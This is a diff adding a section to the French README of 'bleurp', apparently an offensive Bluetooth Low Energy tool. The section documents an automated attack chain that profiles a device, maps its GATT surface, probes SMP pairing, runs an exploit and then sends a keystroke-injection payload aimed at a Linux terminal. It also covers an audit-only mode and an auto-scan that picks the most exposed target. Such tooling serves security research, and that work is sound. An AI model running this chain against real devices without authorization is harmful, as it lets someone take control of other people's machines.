@@ -83,6 +83,19 @@ make setcap
 ./build/bleurp scan -v     # Scan verbeux (EIR constructeur & services annoncés)
 ```
 
+### Chaîne d'attaque automatisée de bout en bout (`attack`)
+
+```sh
+# Chaîne complète sur cible : profilage -> surface GATT -> sonde SMP -> exploit BLERP -> payload
+sudo ./build/bleurp attack AA:BB:CC:DD:EE:FF -t random -p src/hid/send_attack/payloads/linux-terminal.txt
+
+# Audit offensif sans écrasement de session, sortie JSON structurée
+./build/bleurp attack AA:BB:CC:DD:EE:FF --audit-only --json
+
+# Scan automatique de l'environnement (15s) et sélection de la cible la plus exposée
+sudo ./build/bleurp attack --scan 15 -i 0
+```
+
 ### Énumération GATT & audit d'accès non authentifié
 
 ```sh
